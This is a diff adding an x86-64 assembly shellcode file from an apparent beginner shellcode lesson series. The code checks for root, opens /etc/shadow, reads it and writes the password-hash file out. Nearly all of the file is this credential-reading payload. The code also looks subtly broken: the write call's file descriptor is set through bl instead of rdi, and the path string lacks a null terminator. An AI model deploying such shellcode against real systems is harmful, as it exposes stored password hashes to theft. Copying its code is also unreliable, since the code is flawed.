@@ -1,0 +1,63 @@
+;
+; part of my shellcode for noobs lesson series hosted in #goatzzz on irc.enigmagroup.org
+;
+; ----------------------------------------------------------------------------
+; "THE BEER-WARE LICENSE" (Revision 43):
+; <aaronryool@gmail.com> wrote this file. As long as you retain this notice you
+; can do whatever you want with this stuff. If we meet some day, and you think
+; this stuff is worth it, you can buy me a beer in return Aaron R. Yool
+; ----------------------------------------------------------------------------
+; 64bit call: rax args: rdi, rsi, rdx, r10,  r8, and r9
+
+[bits 64]
+section .text
+global _start
+_start:
+; getuid16(void);
+	xor rax,rax
+	mov al,0x66
+	syscall
+	xor rdi,rdi
+	sub rax,rdi
+	jnz exit
+; open("/etc/shadow", O_RDONLY);
+	xor rax,rax
+	mov al,0x2
+	jmp short shadow
+	
+load_shadow:
+	pop rdi
+	xor rsi,rsi
+	syscall
+; read(%rax, %rsp, 0xffff);
+	mov rdi,rax
+	push rdi
+	xor rax,rax
+	mov rsi, rsp
+	xor rdx,rdx
+	mov dx,0xfff
+	syscall
+; write(1, %rsp, %rax)
+	mov rdx,rax
+	xor rax,rax
+	mov al,0x1
+	xor rdi,rdi
+	mov bl,0x1
+	syscall
+; close(%rdi)
+	xor rax,rax
+	mov al,0x3
+	pop rdi
+	syscall
+
+exit:
+; exit(0);
+	xor rax,rax
+	mov al,0x3c
+	xor rdi,rdi
+	syscall
+
+
+shadow:
+	call load_shadow
+	db "/etc/shadow"
